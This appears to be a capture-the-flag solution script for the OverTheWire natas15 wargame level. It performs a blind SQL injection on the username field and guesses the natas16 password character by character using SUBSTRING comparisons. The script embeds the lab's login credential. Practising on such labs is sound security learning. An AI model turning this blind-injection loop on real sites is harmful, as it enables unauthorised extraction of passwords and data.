import requests

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"
auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
alphnum = "azertyuiopmlkjhgfdsqwxcvbnAQWZSXCDERFVBGTYHNJUIKLOPM0123456789"

inj_p1 = 'natas16" AND SUBSTRING(password,1,'
inj_p2 = ')="'

goodpwd = ""

done = False

while not done:
    print("on commence avec goodpwd = " + goodpwd)

    for lettre in alphnum:
        done = True
        data = {"username": inj_p1 + str(len(goodpwd)+1) + inj_p2 + goodpwd + lettre}
        req = requests.post(url, data=data, auth=auth)
        res = req.text
#        print(res)
#        break
        if "exists" in res:
            goodpwd += lettre
            done = False
            print("on avance : so far pwd = " + goodpwd)
            break
print("sortis ; pwd = " + goodpwd)

print("done ; pwd = " +goodpwd)
